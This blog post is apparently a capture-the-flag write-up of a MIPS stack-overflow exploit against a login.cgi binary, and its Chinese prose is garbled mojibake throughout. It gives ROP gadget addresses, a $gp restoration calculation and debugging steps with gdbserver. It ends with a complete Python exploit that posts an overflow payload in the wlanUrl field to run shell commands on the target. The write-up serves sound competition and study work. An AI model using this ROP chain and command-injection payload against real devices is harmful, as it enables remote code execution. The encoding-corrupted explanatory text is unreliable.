<p>åœ¨ <code>libwebutil.so</code> åº“ä¸­æ‰¾ä¸€ä¸‹ <code>system</code> å‡½æ•°ï¼Œäº¤å‰å¼•ç”¨åæœ‰ä¸¤å¤„ã€‚å‘ç° <code>system</code> çš„å‚æ•° <code>$a0</code> å¯„å­˜å™¨éƒ½æ¥è‡ª <code>bss</code> æ®µï¼Œè¿™æ ·å‚æ•°ä¸å¤ªå¥½æ§åˆ¶ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123180128251.png" alt="image-20250123180128251"></p>
<p>æ‰€ä»¥åˆçœ‹äº†ä¸€ä¸‹ <code>do_system</code> å‡½æ•°ï¼Œå‘ç°è¿™ä¸ªå‚æ•° <code>$a0</code> æ˜¯ç”± <code>$s0</code> å¯„å­˜å™¨èµ‹å€¼çš„ï¼Œè€Œ <code>$s0</code> å¯„å­˜å™¨åœ¨ <code>Goto_chidx</code> å‡½æ•°è¿”å›çš„æ—¶å€™å°±å¯æ§äº†ã€‚å› æ­¤ç›´æ¥è·³è½¬åˆ°è¿™é‡Œå°±å¯ä»¥ï¼Œä½†å› ä¸ºå€ŸåŠ© <code>$gp</code> å¯„å­˜å™¨æœ€å¤šè®¿é—® <code>Â±32KB</code> çš„æ•°æ®ï¼Œä¹‹å‰æ‰§è¡Œæµåœ¨ <code>login.cgi</code> çš„ <code>$gp</code> å¯„å­˜å™¨å€¼ä¼šæ¯”è¾ƒå°ã€‚å¦‚æœç›´æ¥å°†æ‰§è¡Œæµè·³è½¬åˆ° <code>libwebutil.so</code> çš„ä»£ç æ®µï¼Œé‚£ä¹ˆä¼šå› ä¸º <code>$gp</code> å¯„å­˜å™¨å¼‚å¸¸ï¼Œä»è€Œæ— æ³•è°ƒç”¨é‡Œé¢çš„ä»»ä½•å‡½æ•°ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123180258428.png" alt="image-20250123180258428"></p>
<p>æ‰€ä»¥è¿˜éœ€è¦å†æ‰¾ä¸€æ®µ <code>gadget</code> æ¥æ¢å¤ <code>$gp</code> å¯„å­˜å™¨ï¼ˆå†™å®Œä¹‹åï¼Œæ‰å‘ç°åœ¨åœ°å€ <code>0x7970</code> å°±å¯ä»¥é¡ºå¸¦ä¿®å¤ <code>$gp</code>äº†ï¼‰ï¼Œæˆ‘æ‰¾çš„ç‰‡æ®µå¦‚ä¸‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.fini:0000A554                 lw      $gp, 16($sp)</span><br><span class="line">.fini:0000A558                 nop</span><br><span class="line">.fini:0000A55C                 lw      $ra, 28($sp)</span><br><span class="line">.fini:0000A560                 jr      $ra</span><br></pre></td></tr></table></figure>

<p>å¤åŸ <code>$gp</code> å¯„å­˜å™¨å°±æ˜¯æ‰¾åˆ°è¦è·³è½¬çš„ç›®æ ‡å‡½æ•° <code>do_system</code>ï¼ŒæŸ¥çœ‹èµ·å§‹æ±‡ç¼–ä»£ç ä¸º <code>li $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</code> ã€‚æŒ‰ç…§è¿™ä¸ªè®¡ç®—æ–¹å¼å¾—åˆ°è¦å¤åŸçš„ <code>$gp</code>ï¼ŒåŒå‡» <code>_GLOBAL_OFFSET_TABLE_</code> è·å–åœ°å€ä¸º <code>0x55560</code> ã€‚å› æ­¤ <code>$gp</code> ä¸º <code>libc_base + _GLOBAL_OFFSET_TABLE_ + 0x7FF0 =&gt; 0x77e1e000+0x55560+0x7FF0 =  0x77e7b550</code>ã€‚ </p>
<p>å¯ä»¥å†™å‡º <code>payload</code>ï¼Œä½†å‘ç°æ‰“ä¸é€šã€‚è¿™ä¸ªæ—¶å€™éœ€è¦å¯¹ <code>cgi</code> è¿›è¡Œè°ƒè¯•ï¼Œå› ä¸º <code>cgi</code> è¿›ç¨‹æ˜¯ç¬æ—¶ç»“æŸï¼ˆä»æ¥æ”¶åˆ°æ•°æ®åŒ…è§¦å‘ï¼Œä¸ä¼šæœ‰é˜»å¡ï¼Œç¬é—´è¿è¡Œç»“æŸï¼‰ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯ <code>patch</code> ç¨‹åºæ‰“ä¸€ä¸ªæ­»å¾ªç¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cmd_addr_in_stack = <span class="number">0x7fff6610</span> <span class="comment">#è¿™ä¸ªæ ˆåœ°å€éœ€è¦è°ƒè¯•è·å–</span></span><br><span class="line">libc_base=<span class="number">0x77e1e000</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span></span><br><span class="line">payload += p32(cmd_addr_in_stack)<span class="comment"># $s0</span></span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p32(libc_base+<span class="number">0xa554</span>)</span><br><span class="line">payload += <span class="string">b&quot;b&quot;</span>*<span class="number">16</span></span><br><span class="line">payload += p32(<span class="number">0x77e7b550</span>)<span class="comment"># $gp</span></span><br><span class="line">payload += <span class="string">b&quot;c&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p32(libc_base+<span class="number">0x7978</span>)</span><br><span class="line">payload += <span class="string">b&quot;touch /zikh26;&quot;</span></span><br></pre></td></tr></table></figure>



<p>åœ¨ <code>set_sys_init</code> å‡½æ•°å¼€å§‹æ—¶ï¼Œéšåæ‰¾ä¸€ä¸ªæ±‡ç¼–æŒ‡ä»¤ï¼Œç›´æ¥ä¿®æ”¹æœºå™¨ç ã€‚<code>mips</code> é‡Œé¢æ­»å¾ªç¯çš„æœºå™¨ç ä¸º <code>FF FF 00 10</code>ï¼ˆæƒ³ä¸èµ·æ¥çš„è¯ï¼Œè‡ªå·±å†™ä¸ªç¨‹åºç¼–è¯‘ä¸€ä¸‹å°±èƒ½çœ‹åˆ°äº†ï¼‰ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123192816826.png" alt="image-20250123192816826" style="zoom:33%;" />

<p>æ”¹å®Œçš„ä¼ªä»£ç æ•ˆæœå¦‚ä¸‹ï¼ˆè®°å¾—ä¿å­˜~ï¼‰ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123192838461.png" alt="image-20250123192838461"></p>
<p>è¿™ä¸ªæ—¶å€™æŠŠåŸæœ¬çš„ <code>login.cgi</code> ç»™æ›¿æ¢æ‰ï¼Œå‘é€æ•°æ®åŒ…åï¼Œå› ä¸ºä¿®æ”¹åçš„ <code>login.cgi</code> ä¼šé™·å…¥æ­»å¾ªç¯å¯¼è‡´è¿›ç¨‹ä¸€ç›´æŒ‚èµ·ã€‚è¿™ä¸ªæ—¶å€™å†ä¼ å…¥ä¸€ä¸ª <code>gdbserver</code> ï¼Œé™„åŠ è¿›ç¨‹è°ƒè¯•ã€‚éœ€è¦åœ¨ <code>qemu</code> å¯åŠ¨è„šæœ¬æ·»åŠ ä¸€ä¸ª <code>9999</code> çš„ç«¯å£æ˜ å°„ï¼Œå¦åˆ™æ— æ³•è¿œç¨‹è°ƒè¯•ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123193428597.png" alt="image-20250123193428597"></p>
<p>ç”¨ <code>gdb-multiarch</code> è¿æ¥ä¸Šåï¼Œåº”è¯¥æ˜¯ä¸€ç›´é˜»å¡åˆ°æ­»å¾ªç¯äº†ï¼ˆå¦‚ä¸‹ï¼‰ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123193722188.png" alt="image-20250123193722188" style="zoom:50%;" />



<p>æ‰§è¡Œä¸€ä¸‹ <code>set *0x4039c0=0x8fbc0018</code> æŠŠåŸæœ¬ä¿®æ”¹çš„æ­»å¾ªç¯æœºå™¨ç ç”¨ <code>set</code> ç»™å¤åŸï¼Œä¸‹é¢å°±å¯ä»¥æ­£å¸¸è°ƒè¯•äº†ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123193920680.png" alt="image-20250123193920680" style="zoom:50%;" />



<p>ç°åœ¨æ˜¯è°ƒè¯•åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆä¸Šé¢çš„ <code>payload</code> æ‰“ä¸é€šï¼Œå‘ç°åœ¨åœ°å€ <code>0x77e22c68</code> å¼€å§‹ä¾æ¬¡å°† <code>$a1 $a2 $a3</code> èµ‹å€¼åˆ° <code>$sp+0x2c</code> èµ·å§‹çš„ä½ç½®ï¼Œå°´å°¬çš„æ˜¯è¿™ä¸ªä½ç½®ï¼ˆ0x7fff65e8+0x2c&#x3D;0x7fff6614ï¼‰æŒ‡å‘å­˜å‚¨æ‰§è¡Œå‘½ä»¤çš„å†…å­˜äº†ï¼Œå¯¼è‡´æ‰§è¡Œçš„å‘½ä»¤è¢«ç ´åã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123194343193.png" alt="image-20250123194343193"></p>
<p>è§£å†³è¿™ä¸ªé—®é¢˜åªéœ€è¦å°†æ‰§è¡Œçš„å‘½ä»¤å¾€æ ˆä¸­é«˜åœ°å€å¤„å¸ƒç½®å³å¯ï¼Œä¿®æ”¹åçš„ <code>payload</code> å¦‚ä¸‹ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">libc_base=<span class="number">0x77e1e000</span> </span><br><span class="line">cmd_addr_in_stack = <span class="number">0x7fff6610</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span></span><br><span class="line">payload += p32(cmd_addr_in_stack+<span class="number">0x20</span>)<span class="comment"># $s0</span></span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p32(libc_base+<span class="number">0xa554</span>)</span><br><span class="line">payload += <span class="string">b&quot;b&quot;</span>*<span class="number">16</span></span><br><span class="line">payload += p32(<span class="number">0x77e7b550</span>)<span class="comment"># $gp</span></span><br><span class="line">payload += <span class="string">b&quot;c&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p32(libc_base+<span class="number">0x7978</span>)</span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span>*<span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&quot;touch /zikh26;&quot;</span></span><br></pre></td></tr></table></figure>

<p>é‡æ–°å‘é€ <code>payload</code> ï¼Œå‘ç°æ–‡ä»¶æˆåŠŸåˆ›å»ºï¼Œè¡¨ç¤ºå‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123195044007.png" alt="image-20250123195044007"></p>
<p>å› ä¸ºé¢˜ç›®æç¤ºè¯´é¶æœºä¸å‡ºç½‘ï¼Œæ‰€ä»¥æ‰§è¡Œçš„å‘½ä»¤å¯ä»¥æ”¹æˆè¿™ä¸ª <code>cp /flag /etc_ro/lighttpd/www/flag.txt</code> ï¼Œç„¶åè®¿é—® <code>/flag.txt</code> å°±å¯ä»¥ç›´æ¥çœ‹åˆ° <code>flag</code> äº†ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123201505855.png" alt="image-20250123201505855"></p>
<p>åœ¨ <code>login.cgi</code> æ–‡ä»¶çš„ <code>main</code> å‡½æ•°è¿˜æœ‰ä¸€ä¸ªå‘ï¼Œæ£€æŸ¥äº†æ•°æ®åŒ…çš„é•¿åº¦ã€‚å¦‚æœè¶…è¿‡ <code>0x1f3</code> å­—èŠ‚ï¼Œåˆ™ä¼šç›´æ¥ <code>return</code>ã€‚å› æ­¤æ— è®ºæ˜¯ <code>rop</code> é“¾å­çš„é•¿åº¦ï¼Œè¿˜æ˜¯æ•°æ®åŒ…ä¸­çš„ <code>body</code> éƒ¨åˆ†æ”¾äº†å…¶ä»–å¤šä½™å­—æ®µï¼Œéƒ½éœ€è¦æ³¨æ„ï¼Œé¿å…è¿‡é•¿å¯¼è‡´è§¦å‘ä¸äº†åŠŸèƒ½ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  v8 = getenv(&quot;CONTENT_LENGTH&quot;);</span><br><span class="line">  v9 = strtol(v8, 0, 10);</span><br><span class="line">  v10 = v9 + 1;</span><br><span class="line">  if ( (unsigned int)(v9 - 1) &gt;= 0x1F3 )</span><br><span class="line">    goto LABEL_3;</span><br><span class="line">......</span><br><span class="line">LABEL_3:</span><br><span class="line">    v5 = (const char *)nvram_bufget(0, &quot;lan_ipaddr&quot;);</span><br><span class="line">    sprintf(v42, &quot;http://%s/login.shtml?login=0&quot;, v5);</span><br><span class="line">    web_redirect_wholepage(v42);</span><br><span class="line">    return 0;</span><br><span class="line">     </span><br></pre></td></tr></table></figure>



<p>å¦‚æœ <code>CONTENT_LENGTH</code> è¶…è¿‡ <code>499</code> é‚£ä¹ˆå“åº”åŒ…å¦‚ä¸‹ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123203154312.png" alt="image-20250123203154312"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">url = <span class="string">&quot;http://192.168.80.129/cgi-bin/login.cgi&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;192.168.80.129&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.80.129/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x77e1e000</span> <span class="comment">#/root/cpio-root/lib/libwebutil.so</span></span><br><span class="line">cmd_addr_in_stack = <span class="number">0x7fff6610</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span></span><br><span class="line">payload += p32(cmd_addr_in_stack+<span class="number">0x20</span>)<span class="comment"># $s0</span></span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p32(libc_base+<span class="number">0xa554</span>)</span><br><span class="line">payload += <span class="string">b&quot;b&quot;</span>*<span class="number">16</span></span><br><span class="line">payload += p32(<span class="number">0x77e7b550</span>)<span class="comment"># $gp</span></span><br><span class="line">payload += <span class="string">b&quot;c&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p32(libc_base+<span class="number">0x7978</span>)</span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span>*<span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&quot;cp /flag /etc_ro/lighttpd/www/flag.txt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># .fini:0000A554                 lw      $gp, 16($sp)</span></span><br><span class="line"><span class="comment"># .fini:0000A558                 nop</span></span><br><span class="line"><span class="comment"># .fini:0000A55C                 lw      $ra, 28($sp)</span></span><br><span class="line"><span class="comment"># .fini:0000A560                 jr      $ra</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $gp =&gt; libc_base + _GLOBAL_OFFSET_TABLE_ + 0x7FF0 =&gt; 0x77e1e000+0x55560+0x7FF0 =  0x77e7b550</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:00007978                 la      $t9, do_system</span></span><br><span class="line"><span class="comment"># .text:0000797C                 nop</span></span><br><span class="line"><span class="comment"># .text:00007980                 jalr    $t9 ; do_system</span></span><br><span class="line"><span class="comment"># .text:00007984                 move    $a0, $s0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;Goto_chidx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlanUrl&#x27;</span>: payload</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>



<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qefJ0YkKgXBUH0gyKGhImA">ç¬¬å…«å±Šè¥¿æ¹–è®ºå‰‘Â·ä¸­å›½æ­å·ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›åˆèµ›å®˜æ–¹Write Upï¼ˆä¸Šï¼‰</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/MIPS%E6%9E%B6%E6%9E%84/" rel="tag"># MIPSæ¶æ„</a>
              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># æ ˆæº¢å‡º</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/f9d998fc.html" rel="prev" title="C++å¼‚å¸¸å¤„ç†éƒ¨åˆ†æºç åˆ†æ&&é—®é¢˜æ¢ç©¶">
                  <i class="fa fa-chevron-left"></i> C++å¼‚å¸¸å¤„ç†éƒ¨åˆ†æºç åˆ†æ&&é—®é¢˜æ¢ç©¶
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  





</body>
</html>
